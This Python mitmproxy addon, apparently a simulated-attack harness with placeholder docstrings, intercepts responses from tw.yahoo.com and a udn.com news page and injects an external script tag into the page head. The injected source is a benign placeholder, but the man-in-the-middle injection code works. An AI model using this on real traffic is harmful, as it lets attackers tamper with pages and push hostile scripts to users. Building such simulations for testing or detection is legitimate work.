import mitmproxy.http
from bs4 import BeautifulSoup
import json

class Insertor:
    """
    Simulated attack information:
        Reported Date: <ISO8601>
        Reported URLs:
            [
                <example1.url>,
                <example2.url>
            ]
        Attack Duration: <start, end>
        Attack Description:
            <Hello world>
        
    """
    TARGET_HOST = "tw.yahoo.com"
    SRC = "https://www.google.com"

    def response(self, flow: mitmproxy.http.HTTPFlow) -> None:
        if not self.__class__.TARGET_HOST == flow.request.host:
            return None
        
        soup = BeautifulSoup(flow.response.get_text(), 'html.parser')

        if soup.head:
            script_soup = BeautifulSoup('<script></script>', 'html.parser')
            script_soup.find('script')['src'] = self.__class__.SRC

            soup.head.append(script_soup)
            flow.response.set_text(str(soup))
        else:
            pass
        
        return None

class NEWS:
    """
    Simulated attack information:
        Reported Date: <ISO8601>
        Reported URLs:
            [
                <example1.url>,
                <example2.url>
            ]
        Attack Duration: <start, end>
        Attack Description:
            <Hello world>
        
    """
    
    TARGET_HOST = "udn.com"
    PAGE = "news/index"
    SRC = "https://www.google.com"

    def response(self, flow: mitmproxy.http.HTTPFlow) -> None:
        if flow.request.host == self.__class__.TARGET_HOST\
            and flow.request.path == self.__class__.PAGE:
            
            soup = BeautifulSoup(flow.response.get_text(), 'html.parser')

            if soup:
                script_soup = BeautifulSoup('<script></script>', 'html.parser')
                script_soup.find('script')['src'] = self.__class__.SRC

                soup.head.append(script_soup)
                flow.response.set_text(str(soup))

            pass
        return None